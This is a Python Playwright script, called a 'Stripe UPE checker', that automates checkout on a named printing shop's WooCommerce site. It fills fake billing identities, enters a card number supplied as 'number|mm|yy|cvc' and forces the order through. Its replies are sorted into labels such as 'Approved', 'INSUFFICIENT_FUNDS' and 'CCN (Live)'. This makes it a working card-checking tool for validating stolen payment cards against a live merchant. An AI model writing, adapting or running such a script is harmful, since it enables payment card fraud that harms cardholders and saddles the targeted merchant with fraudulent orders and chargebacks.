# Cooper Family Printing - Playwright Stripe UPE checker

import asyncio
import re
import random
from playwright.async_api import async_playwright

BASE         = "https://cooperfamilyprinting.com"
PRODUCT_URL  = BASE + "/product/printable-weekly-planner-layout/"
CHECKOUT_URL = BASE + "/checkout/"

FIRST = ["James","John","Michael","David","Robert","William"]
LAST  = ["Smith","Johnson","Williams","Brown","Jones","Garcia"]


async def _check(n, mm, yy, cvc, first, last, email):
    result = {"val": ""}

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        ctx = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        )
        page = await ctx.new_page()

        # ── Block CSS / fonts / images / media on ALL frames ─────────────────
        async def block_resources(route, request):
            if request.resource_type in ("stylesheet", "font", "image", "media"):
                await route.abort()
            else:
                await route.continue_()

        await page.route("**/*", block_resources)

        # ── Intercept responses ───────────────────────────────────────────────
        async def handle_response(resp):
            try:
                url = resp.url
                if "wc-ajax=checkout" in url and resp.status == 200:
                    body = await resp.json()
                    if body.get("result") == "success":
                        result["val"] = "Approved"
                    elif body.get("messages"):
                        msg = re.sub(r"<[^>]+>", "", body["messages"]).strip()
                        msg = re.sub(r'\s+', ' ', msg).strip()
                        if msg:
                            result["val"] = msg
                elif "api.stripe.com/v1/payment_intents" in url:
                    body = await resp.json()
                    if body.get("status") == "succeeded":
                        result["val"] = "Approved"
                    elif "error" in body:
                        err  = body["error"]
                        code = err.get("decline_code") or err.get("code", "")
                        result["val"] = f"{code}: {err.get('message','')}"
                elif "api.stripe.com/v1/payment_methods" in url and resp.status == 200:
                    body = await resp.json()
                    if "error" in body:
                        err  = body["error"]
                        code = err.get("decline_code") or err.get("code", "")
                        result["val"] = f"{code}: {err.get('message','')}"
            except Exception:
                pass

        page.on("response", handle_response)

        try:
            # ── 1. Add to cart ────────────────────────────────────────────────
            await page.goto(PRODUCT_URL, wait_until="domcontentloaded", timeout=30000)
            await page.wait_for_timeout(1500)
            await page.click("button[name='add-to-cart']", timeout=15000, force=True)
            await page.wait_for_timeout(1500)

            # ── 2. Checkout page ──────────────────────────────────────────────
            await page.goto(CHECKOUT_URL, wait_until="domcontentloaded", timeout=30000)
            await page.wait_for_timeout(6000)

            # ── 3. Fill billing form ──────────────────────────────────────────
            await page.fill("#billing_first_name", first)
            await page.fill("#billing_last_name",  last)
            await page.fill("#billing_email",       email)
            await page.fill("#billing_phone",       "2125551234")
            await page.fill("#billing_address_1",   "123 Main St")
            await page.fill("#billing_city",        "New York")
            await page.fill("#billing_postcode",    "10001")
            await page.select_option("#billing_country", "US")
            await page.wait_for_timeout(600)
            try:
                await page.select_option("#billing_state", "NY")
            except Exception:
                pass
            await page.wait_for_timeout(600)

            # ── 4. Fill card in Stripe iframe (retry 3x) ──────────────────────
            card_filled = False
            for attempt in range(3):
                for frame in page.frames:
                    if "stripe" not in frame.url:
                        continue
                    try:
                        num = frame.locator("input[name='number']")
                        if await num.count() > 0:
                            await num.fill(n, timeout=3000)
                            await frame.locator("input[name='expiry']").fill(f"{mm}/{yy}", timeout=3000)
                            await frame.locator("input[name='cvc']").fill(cvc, timeout=3000)
                            card_filled = True
                            break
                    except Exception:
                        pass
                if card_filled:
                    break
                await page.wait_for_timeout(3000)

            if not card_filled:
                await browser.close()
                return "Stripe iframe not found"

            # ── 5. Fill name field in Stripe iframe ───────────────────────────
            for frame in page.frames:
                if "stripe" not in frame.url:
                    continue
                try:
                    nm = frame.locator("input[name='name'], input[placeholder*='name' i], input[autocomplete='cc-name']")
                    if await nm.count() > 0:
                        await nm.fill(f"{first} {last}", timeout=3000)
                        break
                except Exception:
                    pass

            # ── 6. Uncheck "Save my information" in Stripe iframe ─────────────
            # Stripe auto-checks this after card is filled — uncheck it
            await page.wait_for_timeout(1000)  # wait for Stripe to auto-check it
            for frame in page.frames:
                if "stripe" not in frame.url:
                    continue
                try:
                    cb = frame.locator("input[type='checkbox']")
                    if await cb.count() > 0 and await cb.first.is_checked():
                        await cb.first.click(force=True, timeout=3000)
                        print("  [INFO] Unchecked save-info checkbox")
                except Exception:
                    pass

            await page.wait_for_timeout(500)

            # ── 7. Check required checkboxes (terms etc.) ─────────────────────
            for cb in await page.query_selector_all("input[type='checkbox']:not(:checked)"):
                try:
                    name = await cb.get_attribute("name") or ""
                    if any(x in name.lower() for x in ("subscribe", "newsletter", "save")):
                        continue
                    await cb.check()
                except Exception:
                    pass

            # ── 8. Remove ALL overlays + blockUI, then place order ────────────
            # Use JS to click directly — bypasses all overlays instantly
            await page.evaluate("""() => {
                // Remove overlays
                document.querySelectorAll(
                    '.blockUI, .blockOverlay, .woocommerce-store-notice'
                ).forEach(e => e.remove());
                // Enable button
                const btn = document.getElementById('place_order');
                if (btn) {
                    btn.style.pointerEvents = 'auto';
                    btn.style.opacity = '1';
                    btn.disabled = false;
                    btn.click();  // JS click — instant, no delay
                }
            }""")

            # ── 9. Wait for result ────────────────────────────────────────────
            try:
                await page.wait_for_function(
                    """() => {
                        if (window.location.href.includes('order-received')) return true;
                        const err = document.querySelector(
                            '.woocommerce-error li, .woocommerce-notices-wrapper .woocommerce-error li'
                        );
                        return err && err.textContent.trim().length > 5;
                    }""",
                    timeout=25000
                )
            except Exception:
                pass

            if "order-received" in page.url:
                result["val"] = "Approved"

            if not result["val"]:
                try:
                    errors = await page.locator(
                        ".woocommerce-error li, .woocommerce-notices-wrapper li"
                    ).all_text_contents()
                    if errors:
                        result["val"] = " | ".join(e.strip() for e in errors if e.strip())[:200]
                except Exception:
                    pass

            if not result["val"]:
                html = await page.content()
                m = re.search(
                    r"<li[^>]*>\s*((?:There was an error|Your card|The card|Unable to process|"
                    r"declined|insufficient|expired|incorrect)[^<]{5,200})\s*</li>",
                    html, re.IGNORECASE
                )
                if m:
                    result["val"] = m.group(1).strip()

        except Exception as e:
            result["val"] = f"Error: {str(e)[:150]}"
        finally:
            await browser.close()

    return result["val"] or "Unknown"


def Cooper(ccx: str) -> str:
    ccx = ccx.strip()
    parts = ccx.split("|")
    if len(parts) < 4:
        return "Invalid format"

    n   = parts[0]
    mm  = parts[1].zfill(2)
    yy  = parts[2]
    cvc = parts[3].strip()
    if len(yy) == 4:
        yy = yy[-2:]

    first = random.choice(FIRST)
    last  = random.choice(LAST)
    email = f"{first.lower()}.{last.lower()}{random.randint(100,9999)}@gmail.com"

    raw = asyncio.run(_check(n, mm, yy, cvc, first, last, email))

    r = raw.lower()
    if "approved" in r or "order-received" in r:
        return "Approved"
    if "incorrect" in r and "number" in r:
        return "incorrect_number: Your card number is incorrect."
    if "declined" in r:
        return "CARD_DECLINED: " + raw[:150]
    if "insufficient" in r:
        return "INSUFFICIENT_FUNDS"
    if "expired" in r:
        return "EXPIRED_CARD"
    if "cvc" in r or "security code" in r:
        return "INCORRECT_CVC"
    if "authentication" in r or "3d" in r:
        return "3DS_REQUIRED"
    if "problem processing" in r or "unable to process" in r:
        return "CCN (Live)"
    return raw[:200]


if __name__ == "__main__":
    import sys
    card = sys.argv[1] if len(sys.argv) > 1 else input("Card (n|mm|yy|cvc): ").strip()
    print(f"Checking: {card}")
    result = Cooper(card)
    print(f"Result  : {result}")
